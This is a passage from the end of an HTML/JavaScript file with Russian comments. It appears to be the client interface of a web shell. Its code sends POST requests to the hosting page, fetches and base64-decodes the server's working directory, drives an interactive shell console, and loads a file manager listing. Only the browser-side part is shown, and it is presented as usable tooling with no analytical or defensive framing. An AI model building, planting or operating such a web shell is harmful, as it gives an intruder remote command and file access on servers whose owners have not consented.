    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function escapeHtml(string) {
    var div = document.createElement('div');
    div.textContent = string;
    return div.innerHTML;
}

function makeRequest(url, params, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                try {
                    var responseJson = JSON.parse(xhr.responseText);
                    callback(responseJson);
                } catch (error) {
                    console.error("Parse error:", error, xhr.responseText);
                    if (isShellActive) {
                        appendToShell('Error: Invalid response from server<br>');
                        createPrompt();
                    }
                }
            } else {
                if (isShellActive) {
                    appendToShell('Error: Request failed (' + xhr.status + ')<br>');
                    createPrompt();
                }
            }
        }
    };

    var formData = new FormData();
    for (var key in params) {
        if (params[key] !== null && params[key] !== undefined) {
            formData.append(key, params[key]);
        }
    }

    var queryString = Array.from(formData.entries())
    .map(([key, value]) => encodeURIComponent(key) + '=' + encodeURIComponent(value))
    .join('&');

    xhr.send(queryString);
}

// ==================== ИНИЦИАЛИЗАЦИЯ ====================

window.onload = function() {
    eShellContent = document.getElementById("shell-content");

    // Инициализируем текущую директорию
    makeRequest("?feature=pwd", {}, function(response) {
        CWD = atob(response.cwd);
        FM_CWD = CWD;
        createPrompt();
        loadFileList();
    });

    // Закрытие модальных окон по клику вне
    window.onclick = function(event) {
        if (currentModal && event.target.id === currentModal) {
            hideModal(currentModal.replace('Modal', ''));
        }
    };

    // Фокус на shell при клике по консоли
    document.getElementById('shell').onclick = function() {
        if (isShellActive && currentInput) {
            currentInput.focus();
            placeCaretAtEnd(currentInput);
        }
    };

    // Глобальные горячие клавиши
    document.onkeydown = function(e) {
        if (e.ctrlKey && e.key === 'l' && isShellActive) {
            e.preventDefault();
            eShellContent.innerHTML = '';
            createPrompt();
        }
    };
};
</script>
</body>
</html>
